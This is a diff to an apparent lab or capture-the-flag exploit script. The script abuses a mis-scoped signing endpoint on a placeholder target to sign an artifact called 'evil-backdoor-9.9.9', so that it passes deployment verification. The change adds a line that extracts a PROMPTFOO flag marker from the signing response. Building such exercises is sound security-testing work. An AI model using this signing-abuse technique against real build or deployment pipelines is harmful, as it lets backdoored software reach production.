@@ -9,7 +9,9 @@ BASE="${1:-http://target:8080}"
 ARTIFACT="evil-backdoor-9.9.9"
 
 echo "[*] stage 1 — sign an unauthorized artifact (mis-scoped signer) ->"
-sig="$(curl -s -G "$BASE/sign" --data-urlencode "artifact=$ARTIFACT" | python3 -c 'import sys,json;print(json.load(sys.stdin)["signature"])')"
+signresp="$(curl -s -G "$BASE/sign" --data-urlencode "artifact=$ARTIFACT")"
+printf '%s\n' "$signresp" | grep -oE 'PROMPTFOO\{[^}]*\}' | head -n1 || true   # s11a_signature stage marker (per-hop verify §6.3)
+sig="$(printf '%s' "$signresp" | python3 -c 'import sys,json;print(json.load(sys.stdin)["signature"])')"
 echo "    signature=$sig"
 
 echo "[*] stage 2 — the unauthorized artifact passes deployment verification ->"
